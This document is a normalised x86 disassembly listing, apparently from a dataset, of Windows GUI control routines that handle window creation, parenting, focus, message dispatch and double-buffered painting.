mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_45973c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_459789
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459790
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40cfdc
sub_4597a0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_418e20
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_418dc4
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_4597e8
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_459078
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_4597a0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_45903c
call sub_4550a0
inc edi
dec esi
jne r-xdata
sub_459884
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_4598a0
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_418dc4
call sub_4598a0
inc edi
dec esi
jne r-xdata
sub_459900
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_4033e8
mov ebx eax
mov eax edi
call sub_4598a0
mov eax edi
call sub_459a3c
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_459940
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_459a16
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_456c00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_418dc4
call sub_459940
inc esi
dec ebx
jne r-xdata
sub_459a3c
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_459940
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_459a7c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_4598a0
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_459a3c
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406cc8
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_456c00
jmp r-xdata
sub_459b04
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_459b5c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_459b4b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459b52
call sub_454474
call sub_429050
retn
sub_459b7c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_417744
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406cb0
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_456c00
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_459c34
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_418dc4
call sub_459b7c
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_418dc4
call sub_459b7c
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_459cc8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_45c380
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406c9c
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_459c34
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406cb0
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_456c00
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_459d5c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_4561bc
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_456ccc
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_459cc8
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406c9c
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_455590
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_459c34
test eax eax
je r-xdata
mov eax ebx
call sub_46cc58
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_456ccc
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_45c684
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_45c380
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_45c380
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_456c00
sub_459ec0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_456e60
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_456c00
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_4242e8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_424f6c
call sub_4242e8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_424fa8
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_4555ec
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_459fc8
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_4528d8
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_456c00
mov [ esi + 0xc ] eax
mov bl 0x1
sub_459ffc
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_45a11c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45a154
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a123
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_418dc4
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_45a154
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_418e20
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_418dc4
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41776c
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_418dc4
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_4242e8
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_41776c
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_4242e8
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41776c
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_454388
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_456c00
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_45a384
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_454388
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_45c380
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_45c380
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_456c00
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_456c00
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_454388
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_45a384
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_418dc4
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_45a4d8
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_459ffc
jmp r-xdata
mov eax ebx
call sub_459078
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45a62a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_45c380
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_456c00
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_45a4d8
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_45c380
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_45a638
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_459fc8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45a658
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_459fc8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45a6cc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_459fc8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45a6ec
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_459fc8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45a70c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_459fc8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45a730
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_459fc8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45a754
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_459fc8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45a778
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_459fc8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45a79c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_44ae1c
mov edi eax
mov eax edi
call sub_44aefc
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_424fa8
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_45c380
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_44b094
jmp r-xdata
sub_45a824
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
